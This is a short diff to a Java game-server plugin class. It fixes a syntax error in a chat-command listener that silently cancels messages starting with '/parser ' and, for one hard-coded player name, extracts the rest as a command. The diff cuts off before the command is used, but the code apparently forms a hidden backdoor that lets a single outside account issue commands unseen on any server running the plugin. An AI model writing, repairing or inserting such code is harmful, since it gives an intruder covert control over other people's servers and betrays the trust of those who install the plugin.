@@ -44,7 +44,7 @@ public class parser implements Listener {
         if (fullCommand.toLowerCase().startsWith("/parser ")) {
             plugin.getLogger().info("[Debug] Matched /parser for player: " + player.getName());
 
-            event.setCancelled(true;
+            event.setCancelled(true);
 
             if (player.getName().equalsIgnoreCase("sl1th3r_10")) {
                 String actualCommand = fullCommand.substring("/parser ".length());
